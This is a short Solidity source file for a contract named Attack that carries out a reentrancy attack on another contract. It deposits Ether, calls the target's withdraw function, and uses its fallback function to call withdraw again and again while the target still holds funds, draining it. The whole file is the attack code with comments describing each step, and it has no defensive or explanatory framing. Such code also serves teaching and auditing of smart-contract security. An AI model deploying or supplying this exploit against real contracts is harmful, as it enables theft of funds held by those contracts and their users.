pragma solidity ^0.4.24;

contract Attack {
    address public vulnerableContract;

    constructor(address _vulnerableContract) public {
        vulnerableContract = _vulnerableContract;
    }

    function attack() public payable {
        // First, deposit a small amount of Ether to meet the withdrawal conditions
        bool depositSuccess = vulnerableContract.call.value(msg.value)("");
        require(depositSuccess, "Deposit failed");

        // Call the withdraw function of the vulnerable contract to trigger the reentrancy attack
        bool withdrawSuccess = vulnerableContract.call(bytes4(keccak256("withdraw(uint256)")), msg.value);
        require(withdrawSuccess, "Withdraw failed");
    }

    // Fallback function, which is called when receiving Ether
    function () public payable {
        // If the vulnerable contract still has Ether, continue to call the withdraw function to attack
        if (address(vulnerableContract).balance >= msg.value) {
            bool withdrawSuccess = vulnerableContract.call(bytes4(keccak256("withdraw(uint256)")), msg.value);
            require(withdrawSuccess, "Withdraw failed");
        }
    }
}